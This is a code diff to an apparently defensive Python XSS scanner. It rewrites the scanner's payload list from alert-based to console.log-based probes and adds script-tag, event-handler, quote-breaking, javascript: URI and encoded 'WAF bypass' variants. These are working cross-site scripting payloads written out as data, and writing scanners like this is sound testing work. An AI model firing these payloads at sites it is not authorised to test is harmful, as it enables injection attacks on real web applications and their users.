@@ -9,17 +9,34 @@ logger = logging.getLogger(__name__)
 class XSSScanner:
     def __init__(self, client=None):
         self.client = client if client else HttpClient()
+        # General XSS payloads that are effective across sites
         self.payloads = [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "'><script>alert('XSS')</script>",
-            "\"><script>alert('XSS')</script>",
-            "javascript:alert('XSS')",
-            "onmouseover=alert('XSS')",
-            "onerror=alert('XSS')",
-            "<a href=javascript:alert('XSS')>XSS</a>",
-            "<body onload=alert('XSS')>"
+            # Basic XSS vectors
+            "<script>console.log(1)</script>",  # Simple script tag (less aggressive)
+            "<img src=x onerror=console.log(1)>",  # Image error handler
+            "<svg onload=console.log(1)>",  # SVG onload event
+            
+            # Context breaking payloads
+            "'><script>console.log(1)</script>",  # Quote breaking + script
+            "\"><script>console.log(1)</script>",  # Double quote breaking + script
+            "\"'><img src=x onerror=console.log(1)>",  # Mixed quote breaking
+            
+            # Attribute-based XSS
+            "javascript:console.log(1)",  # Javascript protocol
+            "' onmouseover='console.log(1)'",  # Event handler injection
+            "\" onmouseover=\"console.log(1)\"",  # Event handler with double quotes
+            
+            # HTML5 vectors
+            "<details ontoggle=console.log(1)>",  # Details ontoggle event
+            "<body onload=console.log(1)>",  # Body onload event
+            
+            # WAF evasion techniques
+            "<div id=xss>",  # Simple tag that might be reflected
+            "')\"><span id=xss>",  # Context breaking with harmless tag
+            
+            # Encoded payloads for WAF bypass
+            "\x3Cimg src=x onerror=console.log(1)\x3E",  # Hex encoded
+            "\u003Cimg src=x onerror=console.log(1)\u003E"  # Unicode encoded
         ]
         self.encoding_patterns = [
             r'&lt;script&gt;',
